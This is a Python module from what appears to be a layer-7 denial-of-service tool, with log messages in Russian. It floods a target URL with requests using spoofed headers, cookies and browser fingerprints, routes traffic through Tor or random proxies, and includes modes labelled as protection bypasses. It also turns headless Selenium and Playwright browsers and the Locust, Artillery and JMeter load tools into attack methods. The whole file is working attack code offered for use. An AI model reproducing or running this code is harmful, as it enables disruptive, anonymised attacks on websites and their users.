import asyncio
import time
import aiohttp
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from playwright.async_api import async_playwright
from ..config import Config, logger
from ..utils.spoofing import generate_spoofed_headers, generate_cookies, spoof_fingerprint
from ..utils.proxy import get_async_tor_connector, get_random_proxy
import threading

class Layer7Attack:
    def __init__(self, target_url, duration, attack_type):
        self.target_url = target_url
        self.duration = duration
        self.attack_type = attack_type
        self.stop_event = asyncio.Event()

    async def stop(self):
        self.stop_event.set()

class HTTPAttack(Layer7Attack):
    async def run(self, threads=Config['threads']):
        async def http_flood(session):
            headers = generate_spoofed_headers()
            cookies = generate_cookies()
            proxy = get_random_proxy() if Config["use_proxy"] else None
            proxy_url = proxy['socks5'] if proxy else None
            start_time = time.time()
            while time.time() - start_time < self.duration and not self.stop_event.is_set():
                try:
                    if self.attack_type == 'HTTPS-FLOODER':
                        await session.get(self.target_url, headers=headers, cookies=cookies, ssl=False)
                    elif self.attack_type == 'HTTPS-BYPASS':
                        await session.get(self.target_url, headers=headers, cookies=cookies, proxy=proxy_url, ssl=False)
                    elif self.attack_type == 'HTTP-BROWSER':
                        await session.get(self.target_url, headers=generate_spoofed_headers())
                    elif self.attack_type == 'HTTPS-ARTERMIS':
                        await session.post(self.target_url, headers=headers, cookies=cookies, data={'key': 'value'}, ssl=False)
                    logger.info(f"{self.attack_type} запрос отправлен")
                except Exception as e:
                    logger.error(f"Ошибка в {self.attack_type}: {e}")
                await asyncio.sleep(0.1)
        
        connector = await get_async_tor_connector() if Config["use_tor"] else None
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [http_flood(session) for _ in range(threads)]
            await asyncio.gather(*tasks)

class BrowserAttack(Layer7Attack):
    def run_selenium_in_thread(self):
        options = Options()
        options.add_argument(f"user-agent={generate_spoofed_headers()['User-Agent']}")
        if Config["use_proxy"]:
            proxy = get_random_proxy()
            if proxy and 'socks5' in proxy:
                options.add_argument(f"--proxy-server={proxy['socks5']}")
        try:
            driver = webdriver.Chrome(options=options)
            start_time = time.time()
            while time.time() - start_time < self.duration and not self.stop_event.is_set():
                try:
                    driver.get(self.target_url)
                    if Config["browser_behavior"]["clicks"]:
                        driver.execute_script("let links = document.querySelectorAll('a'); if(links.length) links[0].click();")
                    if Config["browser_behavior"]["scroll"]:
                        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
                    logger.info(f"{self.attack_type} Selenium запрос отправлен")
                    time.sleep(Config["browser_behavior"]["delay"])
                except Exception as e:
                    logger.error(f"Ошибка в Selenium: {e}")
                    time.sleep(1)
            driver.quit()
        except Exception as e:
            logger.error(f"Ошибка при создании Selenium: {e}")

    async def run_playwright(self):
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True, proxy=get_random_proxy() if Config["use_proxy"] else None)
                page = await browser.new_page(**spoof_fingerprint())
                start_time = time.time()
                while time.time() - start_time < self.duration and not self.stop_event.is_set():
                    try:
                        await page.goto(self.target_url)
                        if Config["browser_behavior"]["clicks"]:
                            links = await page.query_selector_all('a')
                            if links:
                                await links[0].click()
                        if Config["browser_behavior"]["scroll"]:
                            await page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
                        logger.info(f"{self.attack_type} Playwright запрос отправлен")
                        await asyncio.sleep(Config["browser_behavior"]["delay"])
                    except Exception as e:
                        logger.error(f"Ошибка в Playwright: {e}")
                        await asyncio.sleep(1)
                await browser.close()
        except Exception as e:
            logger.error(f"Ошибка при создании Playwright: {e}")

    async def run(self, threads=Config['threads']):
        if Config["use_browser"] == "selenium":
            await asyncio.gather(*(asyncio.to_thread(self.run_selenium_in_thread) for _ in range(threads)))
        elif Config["use_browser"] == "playwright":
            await asyncio.gather(*(self.run_playwright() for _ in range(threads)))

def get_locust_attack():
    try:
        from locust import HttpUser, task, between
        from ..config import Config, logger
        from ..utils.spoofing import generate_spoofed_headers, generate_cookies

        class LocustAttack(Layer7Attack):
            def run(self, threads=Config['threads']):
                class StressUser(HttpUser):
                    wait_time = between(1, 3)
                    host = self.target_url

                    @task
                    def stress(self):
                        try:
                            self.client.get("/", headers=generate_spoofed_headers(), cookies=generate_cookies())
                        except Exception as e:
                            logger.error(f"Ошибка в Locust: {e}")
                
                from locust.env import Environment
                env = Environment(user_classes=[StressUser])
                env.create_local_runner()
                env.runner.start(threads, spawn_rate=10)
                time.sleep(self.duration)
                env.runner.quit()
                logger.info("Locust атака завершена")
        
        return LocustAttack
    except ImportError:
        logger.warning("Locust not installed. Skipping Locust attack method.")
        return None

def get_artillery_attack():
    try:
        import subprocess
        import json
        from ..config import Config, logger

        class ArtilleryAttack(Layer7Attack):
            def run(self, threads=Config['threads']):
                config = {
                    "config": {
                        "target": self.target_url,
                        "phases": [{
                            "duration": self.duration,
                            "arrivalRate": threads
                        }]
                    },
                    "scenarios": [{
                        "flow": [{
                            "get": {
                                "url": "/"
                            }
                        }]
                    }]
                }
                with open("artillery_config.json", "w") as f:
                    json.dump(config, f)
                
                try:
                    subprocess.run(["artillery", "run", "artillery_config.json"], check=True)
                    logger.info("Artillery атака завершена")
                except Exception as e:
                    logger.error(f"Ошибка в Artillery: {e}")
        
        return ArtilleryAttack
    except ImportError:
        logger.warning("Artillery not installed. Skipping Artillery attack method.")
        return None

def get_jmeter_attack():
    try:
        import subprocess
        from ..config import Config, logger

        class JMeterAttack(Layer7Attack):
            def run(self, threads=Config['threads']):
                jmx_template = f"""
                <jmeterTestPlan version="1.2" properties="5.0" jmeter="5.4.1">
                  <hashTree>
                    <TestPlan guiclass="TestPlanGui" testclass="TestPlan" testname="Test Plan" enabled="true">
                      <stringProp name="TestPlan.comments"></stringProp>
                      <boolProp name="TestPlan.functional_mode">false</boolProp>
                      <boolProp name="TestPlan.tearDown_on_shutdown">true</boolProp>
                      <boolProp name="TestPlan.serialize_threadgroups">false</boolProp>
                      <elementProp name="TestPlan.user_defined_variables" elementType="Arguments" guiclass="ArgumentsPanel" testclass="Arguments" testname="User Defined Variables" enabled="true">
                        <collectionProp name="Arguments.arguments"/>
                      </elementProp>
                      <stringProp name="TestPlan.user_define_classpath"></stringProp>
                    </TestPlan>
                    <hashTree>
                      <ThreadGroup guiclass="ThreadGroupGui" testclass="ThreadGroup" testname="Thread Group" enabled="true">
                        <stringProp name="ThreadGroup.on_sample_error">continue</stringProp>
                        <elementProp name="ThreadGroup.main_controller" elementType="LoopController" guiclass="LoopControlPanel" testclass="LoopController" testname="Loop Controller" enabled="true">
                          <boolProp name="LoopController.continue_forever">false</boolProp>
                          <stringProp name="LoopController.loops">-1</stringProp>
                        </elementProp>
                        <stringProp name="ThreadGroup.num_threads">{threads}</stringProp>
                        <stringProp name="ThreadGroup.ramp_time">1</stringProp>
                        <boolProp name="ThreadGroup.scheduler">true</boolProp>
                        <stringProp name="ThreadGroup.duration">{self.duration}</stringProp>
                        <stringProp name="ThreadGroup.delay"></stringProp>
                        <boolProp name="ThreadGroup.same_user_on_next_iteration">true</boolProp>
                      </ThreadGroup>
                      <hashTree>
                        <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="HTTP Request" enabled="true">
                          <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables" enabled="true">
                            <collectionProp name="Arguments.arguments"/>
                          </elementProp>
                          <stringProp name="HTTPSampler.domain">{self.target_url.split('//')[1].split('/')[0]}</stringProp>
                          <stringProp name="HTTPSampler.port"></stringProp>
                          <stringProp name="HTTPSampler.protocol">{self.target_url.split('//')[0]}</stringProp>
                          <stringProp name="HTTPSampler.contentEncoding"></stringProp>
                          <stringProp name="HTTPSampler.path">/</stringProp>
                          <stringProp name="HTTPSampler.method">GET</stringProp>
                          <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
                          <boolProp name="HTTPSampler.auto_redirects">false</boolProp>
                          <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
                          <boolProp name="HTTPSampler.DO_MULTIPART_POST">false</boolProp>
                          <stringProp name="HTTPSampler.embedded_url_re"></stringProp>
                          <stringProp name="HTTPSampler.connect_timeout"></stringProp>
                          <stringProp name="HTTPSampler.response_timeout"></stringProp>
                        </HTTPSamplerProxy>
                        <hashTree/>
                      </hashTree>
                    </hashTree>
                  </hashTree>
                </jmeterTestPlan>
                """
                with open("test.jmx", "w") as f:
                    f.write(jmx_template)
                
                try:
                    subprocess.run(["jmeter", "-n", "-t", "test.jmx", "-l", "logfile.jtl"], check=True)
                    logger.info("JMeter атака завершена")
                except Exception as e:
                    logger.error(f"Ошибка в JMeter: {e}")
        
        return JMeterAttack
    except ImportError:
        logger.warning("JMeter not installed. Skipping JMeter attack method.")
        return None

# Build the dictionary of attack classes, filtering out any that failed to load
_L7_CLASSES = {
    'HTTPS-FLOODER': HTTPAttack,
    'HTTPS-BYPASS': HTTPAttack,
    'HTTP-BROWSER': HTTPAttack,
    'HTTPS-ARTERMIS': HTTPAttack,
    'BROWSER-SELENIUM': BrowserAttack,
    'BROWSER-PLAYWRIGHT': BrowserAttack,
    'LOCUST-ATTACK': get_locust_attack(),
    'ARTILLERY-ATTACK': get_artillery_attack(),
    'JMETER-ATTACK': get_jmeter_attack()
}

L7_CLASSES = {name: cls for name, cls in _L7_CLASSES.items() if cls is not None}
